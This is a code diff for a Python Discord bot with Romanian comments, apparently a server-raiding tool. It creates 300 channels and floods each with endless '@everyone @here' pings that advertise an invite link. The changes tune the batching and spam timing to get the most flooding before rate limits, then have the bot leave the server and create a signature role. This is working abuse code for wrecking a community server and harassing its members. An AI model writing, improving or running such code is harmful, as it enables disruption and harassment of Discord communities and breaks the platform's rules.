@@ -323,38 +323,27 @@ async def setup(ctx):
     repeat_count = 50
     big_message = (base_text * repeat_count)[:2000]
 
-    # ===== CREARE 300 CANALE CU SPAM CONCURENT PE TOATE =====
+    # ===== CREARE 300 CANALE (batch 40) =====
     total_channels = 300
     font_styles = ["bold", "script", "double"]
     created_channels = []
 
-    await user.send(f"🔄 Încep crearea a {total_channels} de canale și spam simultan...")
+    await user.send(f"🔄 Încep crearea a {total_channels} de canale (batch 40)...")
 
-    async def spam_loop(channel):
-        """Spam continuu pe un canal (până la rate-limit)"""
-        try:
-            # Trimite 30 de perechi (embed + ping) rapid
-            for _ in range(30):
+    send_semaphore = asyncio.Semaphore(12)
+    ping_counts = [5, 6, 7, 8, 9, 10, 11, 12, 14, 15]
+
+    async def send_initial_messages(channel):
+        async with send_semaphore:
+            try:
                 await channel.send(embed=embed_content)
-                await asyncio.sleep(0.02)
-                ping_count = random.randint(5, 12)
+                await asyncio.sleep(0.08)
+                ping_count = random.choice(ping_counts)
                 ping_message = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
                 await channel.send(content=ping_message)
-                await asyncio.sleep(0.02)
-
-            # Apoi spam continuu până la rate-limit
-            while True:
-                ping_count = random.randint(5, 12)
-                msg = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
-                await channel.send(content=msg)
-                await asyncio.sleep(0.02)
-        except discord.HTTPException as e:
-            if e.status == 429:
+                await asyncio.sleep(0.08)
+            except:
                 pass
-            else:
-                raise
-        except:
-            pass
 
     async def create_channel(index):
         try:
@@ -365,7 +354,7 @@ async def setup(ctx):
                 styled_name = base_name
             ch = await guild.create_text_channel(name=styled_name)
             created_channels.append(ch)
-            asyncio.create_task(spam_loop(ch))
+            await send_initial_messages(ch)
         except discord.HTTPException as e:
             if e.status == 429:
                 await user.send(f"⚠️ Rate limit la canalul {index}, continui...")
@@ -374,21 +363,45 @@ async def setup(ctx):
         except Exception as e:
             await user.send(f"⚠️ Eroare canal {index}: {e}")
 
-    # ===== VITEZĂ DE CREARE: ~43 CANALE PE SECUNDĂ CU BATCH 40 =====
     batch_size = 40
-    pause_between_batches = 0.93  # 40 / 43 ≈ 0.93 secunde
+    pause_between_batches = 0.05
 
     for i in range(0, total_channels, batch_size):
         batch = [create_channel(i+j) for j in range(batch_size) if i+j < total_channels]
         await asyncio.gather(*batch)
         await asyncio.sleep(pause_between_batches)
 
-    await user.send(f"✅ Toate cele {len(created_channels)} canale au fost create. Spam-ul continuă în fundal...")
+    await user.send(f"✅ Toate cele {len(created_channels)} canale au fost create!")
 
-    # Așteaptă 3 secunde pentru ca spam-ul să ruleze
-    await asyncio.sleep(3)
+    # ===== SPAM FINAL PE TOATE CANALELE (până la rate limit) =====
+    await user.send("🔄 Începe spam-ul final pe toate canalele...")
 
-    await user.send("✅ Proces finalizat. Părăsesc serverul...")
+    spam_semaphore = asyncio.Semaphore(15)
+
+    async def spam_final(channel):
+        async with spam_semaphore:
+            try:
+                await channel.send(content=big_message)
+                await asyncio.sleep(0.08)
+                await channel.send(embed=embed_content)
+                await asyncio.sleep(0.08)
+                while True:
+                    ping_count = random.randint(5, 12)
+                    msg = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
+                    await channel.send(content=msg)
+                    await asyncio.sleep(0.06)
+            except discord.HTTPException as e:
+                if e.status == 429:
+                    pass
+                else:
+                    raise
+            except:
+                pass
+
+    spam_tasks = [spam_final(ch) for ch in created_channels]
+    await asyncio.gather(*spam_tasks)
+
+    await user.send("✅ Spam final complet. Părăsesc serverul...")
 
     try:
         await guild.create_role(name="1weeksober-on-top")
